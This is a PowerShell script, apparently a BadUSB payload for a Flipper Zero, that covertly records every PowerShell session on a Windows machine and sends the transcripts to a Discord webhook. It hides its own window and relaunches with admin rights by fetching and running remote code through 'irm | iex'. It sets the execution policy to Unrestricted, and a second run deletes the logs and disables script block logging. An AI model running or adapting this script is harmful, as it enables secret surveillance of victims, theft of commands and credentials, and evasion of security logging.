$webhookUrl = "$dc"

$hideWindow = 1 # 1 = Hidden

[Console]::BackgroundColor = "Black"
[Console]::SetWindowSize(60, 20)
Clear-Host
[Console]::Title = "Powershell Logging"

Test-Path $Profile
$directory = Join-Path ([Environment]::GetFolderPath("MyDocuments")) WindowsPowerShell
$ps1Files = Get-ChildItem -Path $directory -Filter *.ps1

Function HideConsole{
    If ($HideWindow -gt 0){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if($hwnd -ne [System.IntPtr]::Zero){
            $Type::ShowWindowAsync($hwnd, 0)
        }
        else{
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    }
}

function CreateRegKeys {
    param ([string]$KeyPath)

    if (-not (Test-Path $KeyPath)) {
        Write-Host "Creating registry keys" -ForegroundColor Green
        New-Item -Path $KeyPath -Force | Out-Null
    }
}

Function RestartScript{
    if($PSCommandPath.Length -gt 0){
        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
    }
    else{
        Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C `$dc='$dc'; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Global-PS-Trascription-to-Discord/main.ps1 | iex") -Verb RunAs
    }

    exit
}

if ($ps1Files.Count -gt 0) {
    Write-Host "Removing Powershell logging" -ForegroundColor Green
    Get-ChildItem -Path $directory -Filter *.ps1 | Remove-Item -Force
    sleep 3
    If (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
        Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Name "EnableModuleLogging" -Value 0
        Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Name "EnableScriptBlockLogging" -Value 0
    }
    exit
}

Write-Host "Checking user permissions.." -ForegroundColor DarkGray

If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Write-Host "Checking Execution Policy.." -ForegroundColor DarkGray
    $policy = Get-ExecutionPolicy
    $Keytest = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell"
    if (($policy -notlike 'Unrestricted') -or ($policy -notlike 'RemoteSigned') -or ($policy -notlike 'Bypass') -or (-not (Test-Path $Keytest))){
        if (($policy -notlike 'Unrestricted') -or ($policy -notlike 'RemoteSigned') -or ($policy -notlike 'Bypass')){
            Write-Host "Execution Policy is Restricted!.." -ForegroundColor Red
        }
        if (-not (Test-Path $Keytest)){
           Write-Host "Registry path doesn't exist!.." -ForegroundColor Red 
        }
        Write-Host "Restarting as Administrator.." -ForegroundColor Red 
        sleep 2
        RestartScript
    }
}
else{
    Write-Host "Ckecking log registry keys.." -ForegroundColor DarkGray
    CreateRegKeys -KeyPath "HKLM:\Software\Policies\Microsoft\Windows\PowerShell"
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Name "EnableModuleLogging" -Value 1
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell" -Name "EnableScriptBlockLogging" -Value 1

    Write-Host "Checking Execution Policy.." -ForegroundColor DarkGray
    $policy = Get-ExecutionPolicy
    if (($policy -ne 'Unrestricted') -or ($policy -ne 'RemoteSigned') -or ($policy -ne 'Bypass')){
        Set-ExecutionPolicy Unrestricted
        Write-Host "Set Execution Policy to Unrestricted." -ForegroundColor Green
    }
    else{
        Write-Host "Execution Policy is already Unrestricted.." -ForegroundColor Green
    }
}

if ($ps1Files.Count -eq 0) {
    Write-Host "Adding Powershell logging" -ForegroundColor Green
    New-Item -Type File $Profile -Force
    Write-Host "`nLOG FILES: $directory`n" -ForegroundColor Cyan
    Write-Host "Closing Script..." -ForegroundColor Red
    sleep 3
}

$scriptblock = @"
`$transcriptDir = Join-Path ([Environment]::GetFolderPath("MyDocuments")) WindowsPowerShell
if (-not (Test-Path `$transcriptDir))
{
    New-Item -Type Directory `$transcriptDir
}
`$dateStamp = Get-Date -Format ((Get-culture).DateTimeFormat.SortableDateTimePattern -replace ':','-')
try 
{
    Start-Transcript "`$transcriptDir\Transcript-`$dateStamp.txt" | Out-Null
}
catch [System.Management.Automation.PSNotSupportedException]
{
    return
}
"@

$scriptblock | Out-File -FilePath $Profile -Force
HideConsole

function Send-ToDiscord {
    param (
        [string]$WebhookUrl,
        [string]$Content
    )
    $body = @{
        content = $Content
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
}

Function RefreshFiles{

    $txtFiles = Get-ChildItem -Path $directory -Filter *.txt
    foreach ($txtfile in $txtFiles) {
    $contents = Get-Content -Path $txtfile.FullName -Raw
    sleep 1 
    $contents = $null
    }

}

$lastPositions = @{}

$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = $directory
$watcher.Filter = "*.txt"
$watcher.IncludeSubdirectories = $true
$watcher.EnableRaisingEvents = $true

$onChangeAction = {
    $file = $Event.SourceEventArgs.FullPath
    $lastPosition = $lastPositions[$file] -as [int]
    $content = Get-Content -Path $file -Raw
    if ($lastPosition -eq $null) {
        $lastPositions[$file] = $content.Length
    }
    elseif ($content.Length -gt $lastPosition) {
        $newContent = $content.Substring($lastPosition)
        Send-ToDiscord -WebhookUrl $webhookUrl -Content $newContent
        $lastPositions[$file] = $content.Length
    }
}

Register-ObjectEvent -InputObject $watcher -EventName "Changed" -Action $onChangeAction

while ($true) {

    RefreshFiles
    Start-Sleep -Seconds 5

}
